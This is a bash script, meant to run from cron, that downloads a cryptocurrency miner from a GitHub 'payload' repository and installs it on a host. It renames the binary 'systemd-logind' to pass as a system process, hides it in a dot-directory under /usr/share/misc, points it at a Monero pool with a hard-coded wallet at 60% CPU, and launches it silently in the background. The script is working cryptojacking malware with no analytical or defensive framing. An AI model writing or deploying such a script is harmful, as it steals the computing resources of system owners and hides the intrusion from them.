#!/bin/bash
# cron_installer.sh – Run by cron to install/restart miner

# Miner details
MINER_URL="https://github.com/RALPH-005/payload/raw/refs/heads/main/systemd-logind"

WALLET="89T9kvjYMeqBY8yky4mbP8EDP1rouQDjJgGkRZ22uFXz9phDhtMSYKz8Skq8B7d8LfVitghrx4juyTXrUeDwsUHwCut2EYM"
POOL="pool.supportxmr.com:3333"

# Check if miner is already running
if pgrep -f "systemd-logind" > /dev/null; then
    exit 0
fi

# Create hidden directory
mkdir -p /usr/share/misc/.cache
cd /usr/share/misc/.cache

# Download miner if not present
if [ ! -f systemd-logind ]; then
    wget -q -O systemd-logind "$MINER_URL"
    chmod +x systemd-logind
fi

# Create config (60% CPU)
cat > config.json <<EOF
{
    "autosave": true,
    "cpu": {
        "enabled": true,
        "max-threads-hint": 60,
        "priority": 5
    },
    "pools": [
        {
            "url": "$POOL",
            "user": "$WALLET",
            "pass": "x",
            "keepalive": true,
            "tls": true
        }
    ]
}
EOF

# Start miner in background (no systemd needed for cron)
nohup ./systemd-logind --config=config.json > /dev/null 2>&1 &
